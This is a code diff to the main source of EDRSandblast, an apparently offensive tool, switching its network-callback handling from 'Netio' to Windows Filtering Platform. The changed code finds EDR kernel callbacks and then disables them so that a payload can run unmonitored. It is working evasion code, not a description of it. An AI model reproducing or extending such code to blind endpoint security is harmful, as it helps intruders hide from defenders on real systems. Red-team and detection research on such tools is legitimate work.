@@ -33,7 +33,7 @@
 #include "../EDRSandblast/EDRSandblast.h"
 #include "../KernellandBypass/memory.h"
 #include "../KernellandBypass/symbol.h"
-#include "../KernellandBypass/netio.h"
+#include "../KernellandBypass/wfp.h"
 
 typedef NTSTATUS(NTAPI* NtQueryInformationProcess_f)(
     HANDLE          ProcessHandle,
@@ -188,7 +188,7 @@ Other options:\n\
     BOOL foundNotifyRoutineCallbacks = FALSE;
     BOOL foundObjectCallbacks = FALSE;
     BOOL foundMinifilterCallbacks = FALSE;
-    BOOL foundNetio = FALSE;
+    BOOL foundWfp = FALSE;
     HOOK* hooks = NULL;
     //TODO implement a "force" mode : remove notify routines & object callbacks without checking if it belongs to an EDR (useful as a last resort if a driver is not recognized)
 
@@ -374,7 +374,10 @@ Other options:\n\
             return EXIT_FAILURE;
         }
 
-InitModulesAndSymbols();
+PSYSTEM_MODULE_INFORMATION moduleRawList = GlobalSetup();
+BOOL kernelInited = KernelSetup(moduleRawList);
+BOOL wfpInited = WfpSetup(moduleRawList);
+LocalFree(moduleRawList);
 
         if (_tcslen(ntoskrnlOffsetCSVPath) == 0) {
             TCHAR offsetCSVName[] = TEXT("NtoskrnlOffsets.csv");
@@ -490,10 +493,10 @@ InitModulesAndSymbols();
         }
         _putts_or_not(TEXT(""));
 
-        _putts_or_not(TEXT("[+] Checking if EDR callbacks are registered for Netio ..."));
-        foundNetio = EnumNetio();
-        _tprintf_or_not(TEXT("[+] [Netio]\t callbacks are %s !\n"), foundNetio ? TEXT("present") : TEXT("not found"));
-        if (foundNetio) {
+        _putts_or_not(TEXT("[+] Checking if EDR callbacks are registered for Wfp ..."));
+        foundWfp = EnumWfp();
+        _tprintf_or_not(TEXT("[+] [Wfp]\t callbacks are %s !\n"), foundWfp ? TEXT("present") : TEXT("not found"));
+        if (foundWfp) {
             isSafeToExecutePayloadKernelland = FALSE;
         }
         _putts_or_not(TEXT(""));
@@ -719,9 +722,9 @@ InitModulesAndSymbols();
                 DisableMinifilterCallbacks();
                 _putts_or_not(TEXT(""));
             }
-            if (foundNetio) {
-                _putts_or_not(TEXT("[+] Disabling Netio callbacks..."));
-                DisableNetio();
+            if (foundWfp) {
+                _putts_or_not(TEXT("[+] Disabling Wfp callbacks..."));
+                DisableWfp();
                 _putts_or_not(TEXT(""));
             }
 
